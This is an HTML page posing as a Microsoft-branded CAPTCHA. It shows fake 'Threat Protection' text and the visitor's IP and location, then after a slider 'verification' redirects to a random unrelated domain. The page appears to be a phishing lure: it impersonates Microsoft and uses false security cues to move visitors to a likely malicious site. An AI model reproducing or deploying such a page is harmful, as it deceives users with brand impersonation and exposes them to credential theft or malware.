<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft-style CAPTCHA</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .captcha-container {
            width: 360px;
            background: #ffffff;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            padding: 25px 20px;
            text-align: center;
        }

        .captcha-logo img {
            width: 80px;
        }

        .captcha-header {
            margin: 15px 0 8px;
            font-size: 16px;
            font-weight: bold;
            color: #333333;
        }

        .captcha-subtext {
            font-size: 13px;
            color: #666666;
            margin-bottom: 15px;
        }

        .slider-container {
            position: relative;
            width: 100%;
            height: 40px;
            background: #f0f0f0;
            border: 1px solid #ddd;
            border-radius: 20px;
            overflow: hidden;
            cursor: pointer;
        }

        .slider-bar {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 0;
            background: #0078d4;
            border-radius: 20px;
            transition: width 0.3s ease;
        }

        .slider-handle {
            position: absolute;
            top: 0;
            left: 0;
            width: 36px;
            height: 36px;
            background: #ffffff;
            border: 1px solid #0078d4;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 2px;
            transition: left 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .slider-handle span {
            font-size: 18px;
            color: #0078d4;
            font-weight: bold;
        }

        .captcha-footer {
            margin-top: 15px;
            font-size: 11px;
            color: #666666;
            text-align: left;
        }

        .captcha-footer .info {
            margin-top: 5px;
        }

        .captcha-footer .info span {
            color: #333333;
        }

        .captcha-message {
            margin-top: 10px;
            font-size: 14px;
            color: #28a745;
            display: none;
        }
    </style>
</head>
<body>
    <div class="captcha-container">
        <div class="captcha-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
        </div>
        <div class="captcha-header">Your privacy matters</div>
        <div class="captcha-subtext">Please verify to continue</div>
        <div class="slider-container" id="slider">
            <div class="slider-bar" id="slider-bar"></div>
            <div class="slider-handle" id="slider-handle">
                <span>→</span>
            </div>
        </div>
        <div class="captcha-message" id="captcha-message">Verification successful!</div>
        <div class="captcha-footer">
            <div>Threat Protection</div>
            <div class="info" id="geo-info">
                <span>Protected Session</span><br>
                <span>IP:</span> <span id="ip-address">Loading...</span><br>
                <span>Location:</span> <span id="location">Loading...</span>
            </div>
        </div>
    </div>

    <script>
        const slider = document.getElementById('slider');
        const sliderHandle = document.getElementById('slider-handle');
        const sliderBar = document.getElementById('slider-bar');
        const message = document.getElementById('captcha-message');
        const ipAddressElement = document.getElementById('ip-address');
        const locationElement = document.getElementById('location');
        let isDragging = false;

        // Fetch IP address and geolocation
        async function fetchGeoInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
                const data = await response.json();
                ipAddressElement.textContent = data.ip;
                locationElement.textContent = `${data.city}, ${data.region}, ${data.country}`;
            } catch (error) {
                ipAddressElement.textContent = 'Error';
                locationElement.textContent = 'Error fetching location';
            }
        }

        fetchGeoInfo();

        slider.addEventListener('mousedown', () => {
            isDragging = true;
        });

        window.addEventListener('mouseup', () => {
            if (isDragging) {
                isDragging = false;
                if (parseInt(sliderHandle.style.left) >= slider.offsetWidth - sliderHandle.offsetWidth) {
                    sliderBar.style.width = '100%';
                    sliderHandle.style.left = `${slider.offsetWidth - sliderHandle.offsetWidth}px`;
                    message.style.display = 'block';
                    setTimeout(() => {
                        window.location.href = "https://tvrcemeheff.statement-proposal-265f.org/mroClOUX";
                    }, 1000); // Redirect after 1 second
                } else {
                    sliderBar.style.width = '0';
                    sliderHandle.style.left = '0';
                }
            }
        });

        window.addEventListener('mousemove', (e) => {
            if (isDragging) {
                const rect = slider.getBoundingClientRect();
                let newLeft = e.clientX - rect.left - sliderHandle.offsetWidth / 2;
                newLeft = Math.max(0, Math.min(newLeft, slider.offsetWidth - sliderHandle.offsetWidth));
                sliderHandle.style.left = `${newLeft}px`;
                sliderBar.style.width = `${newLeft + sliderHandle.offsetWidth / 2}px`;
            }
        });
    </script>
</body>
</html>
